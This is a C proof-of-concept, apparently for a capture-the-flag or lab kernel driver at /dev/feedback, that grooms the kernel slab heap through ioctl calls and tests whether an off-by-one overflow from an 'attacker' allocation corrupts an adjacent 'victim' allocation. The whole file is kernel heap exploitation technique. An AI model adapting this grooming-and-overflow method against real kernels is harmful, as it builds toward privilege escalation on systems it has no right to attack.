#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <errno.h>

#define FEEDBACK_IOCTL_CREATE 0x1337
#define FEEDBACK_IOCTL_EDIT 0x1338
#define FEEDBACK_IOCTL_GET 0x1339
#define FEEDBACK_IOCTL_DELETE 0x133A

struct feedback_ioctl_args {
    uint32_t id;
    uint32_t size;
    char *data;
};

int fd;

int create_fb(uint32_t id, uint32_t size, const char *data) {
    struct feedback_ioctl_args args = { .id = id, .size = size, .data = (char *)data };
    return ioctl(fd, FEEDBACK_IOCTL_CREATE, &args);
}

int get_fb(uint32_t id, uint32_t size, char *data) {
    struct feedback_ioctl_args args = { .id = id, .size = size, .data = data };
    return ioctl(fd, FEEDBACK_IOCTL_GET, &args);
}

int delete_fb(uint32_t id) {
    struct feedback_ioctl_args args = { .id = id };
    return ioctl(fd, FEEDBACK_IOCTL_DELETE, &args);
}

#define TARGET_SLAB_SIZE 128
#define GROOM_COUNT 32
#define VICTIM_ID 1000
#define ATTACKER_ID 1001

void run_test() {
    uint32_t groom_ids[GROOM_COUNT];
    char victim_buf[TARGET_SLAB_SIZE];
    char attacker_buf[TARGET_SLAB_SIZE - 1];
    char check_buf[TARGET_SLAB_SIZE];

    // 1. Fill slabs
    for (int i = 0; i < GROOM_COUNT; i++) {
        groom_ids[i] = i;
        if (create_fb(groom_ids[i], TARGET_SLAB_SIZE, "A") < 0) {
            perror("[-] groom create failed");
            // Don't exit, try to continue
        }
    }

    // 2. Punch holes
    for (int i = 0; i < GROOM_COUNT; i += 2) {
        delete_fb(groom_ids[i]);
    }

    // 3. Place attacker (size-1) - this will have the overflow
    memset(attacker_buf, 'B', sizeof(attacker_buf));
    if (create_fb(ATTACKER_ID, sizeof(attacker_buf), attacker_buf) < 0) {
        perror("[-] attacker create failed");
        return;
    }

    // 4. Place victim
    memset(victim_buf, 'C', sizeof(victim_buf));
    if (create_fb(VICTIM_ID, sizeof(victim_buf), victim_buf) < 0) {
        perror("[-] victim create failed");
        delete_fb(ATTACKER_ID);
        return;
    }

    // 5. Check for corruption
    // The overflow from ATTACKER_ID should corrupt the first byte of VICTIM_ID
    memset(check_buf, 0, sizeof(check_buf));
    if (get_fb(VICTIM_ID, sizeof(check_buf), check_buf) < 0) {
        perror("[-] victim get failed");
    } else {
        if (check_buf[0] != 'C') {
            printf("[+] HIT! Victim's first byte was corrupted: 0x%02x (expected 'C')\n", (unsigned char)check_buf[0]);
        }
    }

    // Cleanup
    delete_fb(ATTACKER_ID);
    delete_fb(VICTIM_ID);
    for (int i = 1; i < GROOM_COUNT; i += 2) {
        delete_fb(groom_ids[i]);
    }
}

int main() {
    sleep(1); // Wait for the device to be ready
    fd = open("/dev/feedback", O_RDWR);
    if (fd < 0) {
        perror("[-] failed to open device");
        return 1;
    }

    printf("[*] Running groom-and-write test...\n");
    run_test();
    printf("[*] Test complete.\n");

    close(fd);
    return 0;
}
